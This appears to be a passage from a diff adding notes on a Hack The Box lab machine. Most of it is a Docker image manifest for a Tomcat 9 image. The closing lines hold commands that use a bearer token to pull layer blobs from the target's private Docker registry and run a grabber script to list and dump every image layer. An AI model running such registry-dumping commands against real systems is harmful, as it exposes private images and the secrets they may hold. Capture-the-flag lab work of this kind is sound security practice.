+         "v1Compatibility": "{\"id\":\"c23e626ece757750f0686befb692e52700626071dcd62c9b7424740c3683a842\",\"parent\":\"ba737ee0cd9073e2003dbc41ebaa4ac347a9da8713ee3cdd18c9099c71d715d7\",\"created\":\"2018-01-10T09:33:33.620084689Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_ASC_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz.asc\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"ba737ee0cd9073e2003dbc41ebaa4ac347a9da8713ee3cdd18c9099c71d715d7\",\"parent\":\"67f844d01db77d9e5e9bdc5c154a8d40bdfe8ec30f2c0aa6c199448aab75f94e\",\"created\":\"2018-01-10T09:33:33.366948345Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_TGZ_URLS=https://www.apache.org/dyn/closer.cgi?action=download\\u0026filename=tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www-us.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://www.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz \\thttps://archive.apache.org/dist/tomcat/tomcat-9/v9.0.2/bin/apache-tomcat-9.0.2.tar.gz\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"67f844d01db77d9e5e9bdc5c154a8d40bdfe8ec30f2c0aa6c199448aab75f94e\",\"parent\":\"61e9c45c309801f541720bb694574780aaf3f9c9ba939afd3a2248f921257e2b\",\"created\":\"2018-01-10T09:33:33.130789837Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_SHA1=b59e1d658a4edbca7a81d12fd6f20203a4da9743\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"61e9c45c309801f541720bb694574780aaf3f9c9ba939afd3a2248f921257e2b\",\"parent\":\"7aa678f161898c0b2fb24800833ec8a88e29662a4aeb73d9fd09f0f3e2880638\",\"created\":\"2018-01-10T09:33:32.902199138Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_VERSION=9.0.2\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"7aa678f161898c0b2fb24800833ec8a88e29662a4aeb73d9fd09f0f3e2880638\",\"parent\":\"d436c875c4061e0058d744bb26561bc738cba69b135416d441401faeb47b558c\",\"created\":\"2018-01-10T09:33:32.656603152Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_MAJOR=9\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"d436c875c4061e0058d744bb26561bc738cba69b135416d441401faeb47b558c\",\"parent\":\"15ee0d244e69dcb1e0ff2817e31071a18a7352ae4e5bb1765536a831bf69ecfc\",\"created\":\"2018-01-10T09:33:29.658955433Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -ex; \\tfor key in $GPG_KEYS; do \\t\\tgpg --keyserver ha.pool.sks-keyservers.net --recv-keys \\\"$key\\\"; \\tdone\"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"15ee0d244e69dcb1e0ff2817e31071a18a7352ae4e5bb1765536a831bf69ecfc\",\"parent\":\"ff0264281c2fadd4108ccac96ddce82587bc26666b918f31bcb43b7ef73c65e8\",\"created\":\"2018-01-10T09:33:20.722817917Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV GPG_KEYS=05AB33110949707C93A279E3D3EFE6B686867BA6 07E48665A34DCAFAE522E5E6266191C37C037D42 47309207D818FFD8DCD3F83F1931D684307A10A5 541FBE7D8F78B25E055DDEE13C370389288584E7 61B832AC2F1C5A90F0F9B00A1C506407564C17A3 79F7026C690BAA50B92CD8B66A3AD3F4F22C4FED 9BA44C2621385CB966EBA586F72C284D731FABEE A27677289986DB50844682F8ACB77FC2E86E29AC A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243 F3A04C595DB5B6A5F1ECA43E3B7BBB100D811BBE F7DA48BB64BCB84ECBA7EE6935CD23C10D498E23\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"ff0264281c2fadd4108ccac96ddce82587bc26666b918f31bcb43b7ef73c65e8\",\"parent\":\"4d9c918fda475437138013a0cf2e0c9086e7c1ed8190c1a0cef8d2b882937428\",\"created\":\"2018-01-10T09:29:11.265649726Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c apk add --no-cache gnupg\"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"4d9c918fda475437138013a0cf2e0c9086e7c1ed8190c1a0cef8d2b882937428\",\"parent\":\"7577bdb4d1f873242bef6582d26031cdea0a64cccf8f8608a8c07cb3cc74611e\",\"created\":\"2018-01-10T09:29:07.609109611Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"7577bdb4d1f873242bef6582d26031cdea0a64cccf8f8608a8c07cb3cc74611e\",\"parent\":\"839af1242b7dcef37994affedfee3e2c52246e521ac101e703737fc0164cdf5c\",\"created\":\"2018-01-10T09:29:07.376174727Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"839af1242b7dcef37994affedfee3e2c52246e521ac101e703737fc0164cdf5c\",\"parent\":\"ea6f6f5cf5c076bca613117419ab5c2d591798dc146fa25b1ab5f77dadf35a0c\",\"created\":\"2018-01-10T09:29:07.155029096Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) WORKDIR /usr/local/tomcat\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"ea6f6f5cf5c076bca613117419ab5c2d591798dc146fa25b1ab5f77dadf35a0c\",\"parent\":\"c55835e0e7564582d31203616f363dfb303cab260c1a6dec9a2a0329a8e27b81\",\"created\":\"2018-01-10T09:29:06.890891119Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c mkdir -p \\\"$CATALINA_HOME\\\"\"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"c55835e0e7564582d31203616f363dfb303cab260c1a6dec9a2a0329a8e27b81\",\"parent\":\"32c57341ccdca27052b71277715b86f2c0ad436ac493bb79467a8df664379ba9\",\"created\":\"2018-01-10T09:29:06.087097667Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV PATH=/usr/local/tomcat/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"32c57341ccdca27052b71277715b86f2c0ad436ac493bb79467a8df664379ba9\",\"parent\":\"c54559a23f245bd25ad627150eaadb1e99a60811ad2955e6a747f2a59b09b22b\",\"created\":\"2018-01-10T09:29:05.864118034Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV CATALINA_HOME=/usr/local/tomcat\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"c54559a23f245bd25ad627150eaadb1e99a60811ad2955e6a747f2a59b09b22b\",\"parent\":\"86a2c94b64bc779ec79acaa9f0ab00dff4a664d23f7546330a3165f1137cd596\",\"created\":\"2018-01-10T04:52:04.664605562Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c set -x \\t\\u0026\\u0026 apk add --no-cache \\t\\topenjdk8-jre=\\\"$JAVA_ALPINE_VERSION\\\" \\t\\u0026\\u0026 [ \\\"$JAVA_HOME\\\" = \\\"$(docker-java-home)\\\" ]\"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"86a2c94b64bc779ec79acaa9f0ab00dff4a664d23f7546330a3165f1137cd596\",\"parent\":\"8ad7d8482d05498820d3256b0ba7eeaf21b8e7ab63044a4bce65116a5dac6a49\",\"created\":\"2018-01-10T04:51:57.540527702Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV JAVA_ALPINE_VERSION=8.151.12-r0\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"8ad7d8482d05498820d3256b0ba7eeaf21b8e7ab63044a4bce65116a5dac6a49\",\"parent\":\"55332c2663c5991fc04851d7980056a37cf2d703e90ef658fd8adccd947f5ca1\",\"created\":\"2018-01-10T04:51:57.314525921Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV JAVA_VERSION=8u151\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"55332c2663c5991fc04851d7980056a37cf2d703e90ef658fd8adccd947f5ca1\",\"parent\":\"3f24ff911184223f9c7e0b260cce136bc9cededdbdce79112e2a84e4c34bb568\",\"created\":\"2018-01-10T04:51:57.072315887Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"3f24ff911184223f9c7e0b260cce136bc9cededdbdce79112e2a84e4c34bb568\",\"parent\":\"0ed181ef14afa5947383aaa2644e5ece84fb1a70f3156708709f2d04b6a6ec9e\",\"created\":\"2018-01-10T04:51:56.850972184Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV JAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jre\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"0ed181ef14afa5947383aaa2644e5ece84fb1a70f3156708709f2d04b6a6ec9e\",\"parent\":\"5a545e9783766d38b2d99784c9d9bf5ed547bf48e1a293059b4cc7f27dd34b31\",\"created\":\"2018-01-10T04:48:25.431215554Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c { \\t\\techo '#!/bin/sh'; \\t\\techo 'set -e'; \\t\\techo; \\t\\techo 'dirname \\\"$(dirname \\\"$(readlink -f \\\"$(which javac || which java)\\\")\\\")\\\"'; \\t} \\u003e /usr/local/bin/docker-java-home \\t\\u0026\\u0026 chmod +x /usr/local/bin/docker-java-home\"]}}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"5a545e9783766d38b2d99784c9d9bf5ed547bf48e1a293059b4cc7f27dd34b31\",\"parent\":\"2dea27bce7d674e8140e0378fe5a51157011109d9da593bab1ecf86c93595292\",\"created\":\"2018-01-10T04:48:24.510692074Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  ENV LANG=C.UTF-8\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"2dea27bce7d674e8140e0378fe5a51157011109d9da593bab1ecf86c93595292\",\"parent\":\"28a0c8bbcab32237452c3dadfb8302a6fab4f6064be2d858add06a7be8c32924\",\"created\":\"2018-01-09T21:10:58.579708634Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
+      },
+      {
+         "v1Compatibility": "{\"id\":\"28a0c8bbcab32237452c3dadfb8302a6fab4f6064be2d858add06a7be8c32924\",\"created\":\"2018-01-09T21:10:58.365737589Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:093f0723fa46f6cdbd6f7bd146448bb70ecce54254c35701feeceb956414622f in / \"]}}"
+      }
+   ],
+   "signatures": [
+      {
+         "header": {
+            "jwk": {
+               "crv": "P-256",
+               "kid": "PMNQ:TCMH:AZI6:H5RF:V2V4:P4B5:TPDL:RJTX:GUIC:5PU3:MPMS:OCMO",
+               "kty": "EC",
+               "x": "05H3SKcgBfvbVUc80oyb95fNUVAADl3tmknwVGr8y2Q",
+               "y": "45SQLzqXk8x7HjxpDU0CRGxkn8D_1y-PWrIBBf4acm4"
+            },
+            "alg": "ES256"
+         },
+         "signature": "RahQQbqjjlJKhnIrAnrEGnBQ1SNyD81AJsZyNhEe6LpJw1kU70BlWN9uiAsXRRfM_FbHDTXJdZYkYJ7vawpq9w",
+         "protected": "eyJmb3JtYXRMZW5ndGgiOjI2MDkxLCJmb3JtYXRUYWlsIjoiQ24wIiwidGltZSI6IjIwMjMtMDctMjlUMDU6NDg6MTlaIn0"
+      }
+   ]
+}
+
+curl -k --location 'https://webhosting.htb:5000/v2/hosting-app/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4' --header 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwNjEwNDQ5LCJuYmYiOjE2OTA2MDk1MzksImlhdCI6MTY5MDYwOTU0OSwianRpIjoiNjM4OTk0OTI2MjMyNjQxNDgxMSIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.VTlRghSzTPsJG5kNog1JH82jDxZrptKSm9Oai7rswlrFJd8PCUfVOv9Xg2bbZgJuJBnpniMcVaYXHdn4y3E0BaeOQSY-2DpbKG5wx3kAWmzHdV0ng5apTFxAiNMMxyQ6s3hL9m5I4BPSVQpQNUqo91WunC0XZ43nKIwiMzhGRKnmi44QnMyTUamNSVkQud_chznqzk9jKgFl3UiZGCb4g29KMSl52hhjJsqWKPnB2QndWuzwsUt5HON24SbbjZikFeMTnj6s-O7hwDsJoqr5TeyESZuMwwlNj61eRNwJGcBe9abTIfgx2rWM3e-oAOH-vR_R1W5ATEgjVQxnAimOHQ' --output blob1.tar
+
+python3 ./dockerRegGrabber.py  https://www.webhosting.htb -A eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwNjEzMjM4LCJuYmYiOjE2OTA2MTIzMjgsImlhdCI6MTY5MDYxMjMzOCwianRpIjoiMzY3MzY0NjU2ODQ5OTIyNTA2MCIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.Vvsu97bYeHi46qEbzNL2-R9LJfXj6QwMJkLMAXy86pQmMciOvffJji5w1VIiWHLLyhmNBjxb0OW1VWHbiMO3hRj34orb_mrtqerqZAcLWp5d4AWu1c1WArneY5QVsy7mw0ocp1R6_EaSf7ouK8wUZotUYy440fFMF-g4jZVSbO7VKFZ3CYgfwBAn90azTj6_fhbYQz4ol9nTFk0jI5MB_AXEf8UR3sNC2QNOPde5z33bv-zu8j5M-DLx-YnN4mkAFlQpu94xOvUtzc-ZFoE9t3TkQqFrqdqAtPN0Jy7x9kfUFGUYCzLduswef6uomjfVp7k8bUM3Eu8ymt5wU6fHiA --list
+
+python3 ./dockerRegGrabber.py  https://www.webhosting.htb -A eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6IlFYNjY6MkUyQTpZT0xPOjdQQTM6UEdRSDpHUVVCOjVTQk06UlhSMjpUSkM0OjVMNFg6TVVZSjpGSEVWIn0.eyJpc3MiOiJBY21lIGF1dGggc2VydmVyIiwic3ViIjoiIiwiYXVkIjoiRG9ja2VyIHJlZ2lzdHJ5IiwiZXhwIjoxNjkwNjEzMjM4LCJuYmYiOjE2OTA2MTIzMjgsImlhdCI6MTY5MDYxMjMzOCwianRpIjoiMzY3MzY0NjU2ODQ5OTIyNTA2MCIsImFjY2VzcyI6W3sidHlwZSI6InJlcG9zaXRvcnkiLCJuYW1lIjoiaG9zdGluZy1hcHAiLCJhY3Rpb25zIjpbInB1bGwiXX1dfQ.Vvsu97bYeHi46qEbzNL2-R9LJfXj6QwMJkLMAXy86pQmMciOvffJji5w1VIiWHLLyhmNBjxb0OW1VWHbiMO3hRj34orb_mrtqerqZAcLWp5d4AWu1c1WArneY5QVsy7mw0ocp1R6_EaSf7ouK8wUZotUYy440fFMF-g4jZVSbO7VKFZ3CYgfwBAn90azTj6_fhbYQz4ol9nTFk0jI5MB_AXEf8UR3sNC2QNOPde5z33bv-zu8j5M-DLx-YnN4mkAFlQpu94xOvUtzc-ZFoE9t3TkQqFrqdqAtPN0Jy7x9kfUFGUYCzLduswef6uomjfVp7k8bUM3Eu8ymt5wU6fHiA --dump_all
+
